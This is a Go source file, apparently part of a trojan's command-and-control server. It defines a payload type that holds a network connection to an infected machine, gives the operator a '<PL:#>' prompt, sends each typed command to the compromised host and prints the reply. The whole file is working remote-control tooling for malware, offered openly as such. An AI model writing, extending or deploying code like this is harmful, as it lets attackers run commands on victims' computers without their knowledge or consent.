package cc

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

// Payload describes the connection with a trojan payload
type Payload struct {
	ID   string
	Addr net.Addr
	Conn net.Conn
}

// Activate starts up a new payload command and control
func (p *Payload) Activate() {
	// Keep listening fot std inputs
	for {
		exit := false
		fmt.Print("<PL:#> ")
		// Read the input from stdin
		reader := bufio.NewReader(os.Stdin)
		text, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("[ERROR] reading std input", err)
			continue
		}

		cleanedText := strings.TrimSpace(text)

		// Check commands
		switch {
		case cleanedText == "exit":
			fmt.Println("Exiting trojan")
			exit = true
			break
		default:
			p.execCommand(cleanedText)
		}

		if exit {
			break
		}
	}
}

func (p *Payload) execCommand(txt string) {
	// send the text to the server
	fmt.Fprintf(p.Conn, txt+"\n\r")
	// listen for replies
	msg, err := bufio.NewReader(p.Conn).ReadString('\r')
	if err != nil {
		fmt.Println(err)
	}
	fmt.Print(msg)
}
